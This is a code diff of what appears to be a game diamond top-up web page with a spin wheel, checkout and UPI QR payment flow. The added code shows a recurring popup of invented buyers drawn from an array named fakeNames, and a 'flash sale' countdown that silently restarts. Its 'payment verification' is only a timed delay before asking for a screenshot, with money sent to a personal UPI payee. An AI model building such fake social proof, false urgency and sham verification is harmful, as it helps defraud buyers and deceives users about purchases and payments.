+    btn.textContent = "🔄 SPIN AGAIN";
+  }, 4400);
 }
-
-spinning=true;
-
-const btn=
-document.getElementById("spinBtn");
-
-const wheel=
-document.getElementById("wheel");
-
-btn.disabled=true;
-btn.textContent="🎡 SPINNING...";
-
-playClickSound();
-
-const wheelOrder=[
-520,
-1060,
-2180,
-5600
-];
-
-const availableValues=
-available.map(
-item=>item.diamonds
-);
-
-const winnerValue=
-availableValues[
-Math.floor(
-Math.random()*availableValues.length
-)
-];
-
-spinResult=
-diamonds.find(
-item=>item.diamonds===winnerValue
-);
-
-const index=
-wheelOrder.indexOf(winnerValue);
-
-const current=
-((wheelRotation%360)+360)%360;
-
-const targetAngle=
-(360-index*90)%360;
-
-const correction=
-(targetAngle-current+360)%360;
-
-wheelRotation+=
-(360*6)+correction;
-
-wheel.style.transform=
-`rotate(${wheelRotation}deg)`;
-
-setTimeout(()=>{
-
-showSpinReward(spinResult);
-
-spinning=false;
-
-btn.disabled=false;
-
-btn.textContent="🔄 SPIN AGAIN";
-
-},4400);
-
-}
-
-
-/* REWARD */
 
 function showSpinReward(item){
+  document.getElementById("wonDiamonds").textContent = "+" + item.diamonds + " 💎";
+  document.getElementById("wonInfo").textContent = "+" + item.diamonds + " Diamonds";
+  document.getElementById("recommendedPack").textContent = item.diamonds + " Diamonds";
+  document.getElementById("recommendedPrice").textContent = "₹" + item.price;
+  document.getElementById("rewardText").innerHTML = `💎 Spin result: <b>${item.diamonds} Diamonds pack</b><br>🛒 Select pack to continue to payment.`;
 
-if(!item)
-return;
-
-document.getElementById("wonDiamonds")
-.textContent=
-"+"+item.diamonds+" 💎";
-
-document.getElementById("wonInfo")
-.textContent=
-"+"+item.diamonds+" Diamonds";
-
-document.getElementById("recommendedPack")
-.textContent=
-item.diamonds+" Diamonds";
-
-document.getElementById("recommendedPrice")
-.textContent=
-"₹"+item.price;
-
-document.getElementById("rewardText")
-.innerHTML=`
-💎 Spin result:
-<b>${item.diamonds} Diamonds pack</b>
-<br><br>
-🛒 You can select this pack and continue to payment.
-`;
-
-const popup=
-document.getElementById("rewardPopup");
-
-popup.style.display="block";
-
-popup.scrollIntoView({
-behavior:"smooth",
-block:"center"
-});
-
+  const popup = document.getElementById("rewardPopup");
+  popup.style.display = "block";
+  popup.scrollIntoView({ behavior:"smooth", block:"center" });
 }
-
-
-/* SELECT SPIN */
 
 function selectSpinPack(){
-
-if(!spinResult)
-return;
-
-const card=
-document.querySelector(
-`.diamond-card[data-id="${spinResult.id}"]`
-);
-
-if(card){
-selectProduct(spinResult,card);
-
-// Smooth auto-scroll down to payment section
-document.querySelector('.payment').scrollIntoView({
-behavior:'smooth'
-});
+  if(!spinResult) return;
+  const card = document.querySelector(`.diamond-card[data-id="${spinResult.id}"]`);
+  if(card){
+    selectProduct(spinResult, card);
+    document.querySelector('.payment').scrollIntoView({ behavior:'smooth' });
+  }
 }
-
-}
-
-
-/* COPY */
-
-function copyReward(){
-
-if(!spinResult)
-return;
-
-const text=
-`SPIN RESULT
-Winning Pack: ${spinResult.diamonds} Diamonds
-Pack Price: ₹${spinResult.price}`;
-
-if(navigator.clipboard){
-
-navigator.clipboard
-.writeText(text)
-.then(()=>{
-alert("✓ Details copied!");
-});
-
-}else{
-
-alert(text);
-
-}
-
-}
-
-
-/* CHECKOUT */
 
 function checkout(){
+  if(!selectedProduct){
+    alert("Please pehle koi product select karo.");
+    return;
+  }
 
-if(!selectedProduct){
+  const uid = document.getElementById("uid").value.trim();
+  if(uid.length < 5){
+    alert("Please pehle Player UID verify karo.");
+    return;
+  }
 
-alert(
-"Please pehle koi product select karo."
-);
+  document.getElementById("payAmount").textContent = "₹" + selectedPrice;
 
-return;
+  // DYNAMIC UPI QR
+  const upiURI = `upi://pay?pa=${UPI_ID}&pn=WASIM%20SK&am=${selectedPrice}&cu=INR`;
+  document.getElementById("dynamicQR").src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiURI)}`;
 
+  document.getElementById("paymentStep").style.display = "block";
+  document.getElementById("mobileStep").style.display = "none";
+  document.getElementById("verificationStep").style.display = "none";
+  document.getElementById("screenshotStep").style.display = "none";
+  document.getElementById("paymentModal").style.display = "block";
 }
 
-const uid=
-document.getElementById("uid")
-.value.trim();
-
-if(uid.length<5){
-
-alert(
-"Please pehle Player UID verify karo."
-);
-
-return;
-
-}
-
-document.getElementById("payAmount")
-.textContent=
-"₹"+selectedPrice;
-
-// DYNAMIC UPI QR GENERATION
-const upiURI = `upi://pay?pa=${UPI_ID}&pn=WASIM%20SK&am=${selectedPrice}&cu=INR`;
-const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiURI)}`;
-document.getElementById("dynamicQR").src = qrUrl;
-
-document.getElementById("paymentStep")
-.style.display="block";
-
-document.getElementById("mobileStep")
-.style.display="none";
-
-document.getElementById("verificationStep")
-.style.display="none";
-
-document.getElementById("screenshotStep")
-.style.display="none";
-
-document.getElementById("customerMobile")
-.value="";
-
-document.getElementById("paymentTimer")
-.textContent="01:00";
-
-document.getElementById("paymentTimer")
-.style.color="#fff";
-
-document.getElementById("paymentModal")
-.style.display="block";
-
-}
-
-
-/* PAYMENT */
-
-function closePayment(){
-
-document.getElementById("paymentModal")
-.style.display="none";
-
-}
-
-function showMobileStep(){
-
-document.getElementById("paymentStep")
-.style.display="none";
-
-document.getElementById("mobileStep")
-.style.display="block";
-
-}
+function closePayment(){ document.getElementById("paymentModal").style.display = "none"; }
+function showMobileStep(){ document.getElementById("paymentStep").style.display = "none"; document.getElementById("mobileStep").style.display = "block"; }
 
 function startPaymentVerification(){
+  const mobile = document.getElementById("customerMobile").value.trim();
+  if(!/^[0-9]{10}$/.test(mobile)){
+    alert("Please enter a valid 10 digit mobile number.");
+    return;
+  }
 
-const mobile=
-document.getElementById("customerMobile")
-.value.trim();
+  document.getElementById("mobileStep").style.display = "none";
+  document.getElementById("verificationStep").style.display = "block";
 
-if(!/^[0-9]{10}$/.test(mobile)){
-
-alert(
-"Please enter a valid 10 digit mobile number."
-);
-
-return;
-
+  setTimeout(() => {
+    document.getElementById("verificationStep").style.display = "none";
+    document.getElementById("screenshotStep").style.display = "block";
+    startPaymentTimer();
+  }, 2500);
 }
-
-document.getElementById("mobileStep")
-.style.display="none";
-
-document.getElementById("verificationStep")
-.style.display="block";
-
-setTimeout(function(){
-
-document.getElementById("verificationStep")
-.style.display="none";
-
-document.getElementById("screenshotStep")
-.style.display="block";
-
-startPaymentTimer();
-
-},2500);
-
-}
-
-
-/* TIMER */
 
 function startPaymentTimer(){
+  let seconds = 60;
+  const timer = document.getElementById("paymentTimer");
+  clearInterval(paymentTimerInterval);
 
-if(paymentTimerInterval)
-clearInterval(paymentTimerInterval);
-
-let seconds=60;
-
-const timer=
-document.getElementById("paymentTimer");
-
-timer.textContent="01:00";
-
-paymentTimerInterval=
-setInterval(function(){
-
-seconds--;
-
-const minutes=
-String(
-Math.floor(seconds/60)
-).padStart(2,"0");
-
-const remaining=
-String(seconds%60)
-.padStart(2,"0");
-
-timer.textContent=
-minutes+":"+remaining;
-
-if(seconds<=0){
-
-clearInterval(paymentTimerInterval);
-
-timer.textContent="WAITING";
-
-timer.style.color=
-"var(--yellow)";
-
+  paymentTimerInterval = setInterval(() => {
+    seconds--;
+    timer.textContent = `00:${String(seconds).padStart(2,"0")}`;
+    if(seconds <= 0){
+      clearInterval(paymentTimerInterval);
+      timer.textContent = "WAITING";
+    }
+  }, 1000);
 }
-
-},1000);
-
-}
-
-
-/* COPY UPI */
 
 function copyUPI(){
-
-playClickSound();
-
-const id=
-"topup24servis@naviaxis";
-
-if(navigator.clipboard){
-
-navigator.clipboard
-.writeText(id)
-.then(()=>{
-
-alert(
-"✓ UPI ID Copied!\n\n"+id
-);
-
-});
-
-}else{
-
-alert(
-"UPI ID:\n"+id
-);
-
+  navigator.clipboard.writeText(UPI_ID);
+  alert("✓ UPI ID Copied!\n" + UPI_ID);
 }
 
+/* LIVE FLASH SALE TIMER */
+function startFlashTimer(){
+  let time = 599;
+  const el = document.getElementById("flashTimer");
+  setInterval(() => {
+    time--;
+    if(time < 0) time = 599;
+    const m = String(Math.floor(time/60)).padStart(2,"0");
+    const s = String(time%60).padStart(2,"0");
+    el.textContent = `${m}:${s}`;
+  }, 1000);
 }
 
+/* LIVE RECENT BUYER POPUP */
+const fakeNames = ["Rahul", "Aman", "Rohan", "Vikram", "Suraj", "Deepak", "Aakash"];
+const fakePacks = ["310 Diamonds", "520 Diamonds", "1060 Diamonds", "Special Airdrop"];
 
-/* MODAL */
+function showSalesToast(){
+  const toast = document.getElementById("salesToast");
+  const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+  const pack = fakePacks[Math.floor(Math.random() * fakePacks.length)];
+  const uid = Math.floor(1000 + Math.random() * 9000);
 
-document.getElementById("paymentModal")
-.addEventListener(
-"click",
-function(e){
+  document.getElementById("toastName").textContent = `${name} (UID ${uid}***)`;
+  toast.querySelector(".toast-text span").textContent = `bought ${pack} just now`;
 
-if(e.target===this)
-closePayment();
+  toast.classList.add("show");
+  setTimeout(() => toast.classList.remove("show"), 3500);
+}
 
-});
-
-
-/* INIT */
+setInterval(showSalesToast, 7000);
 
 renderDiamonds();
 renderPasses();
-
+startFlashTimer();
 </script>
 
 </body>
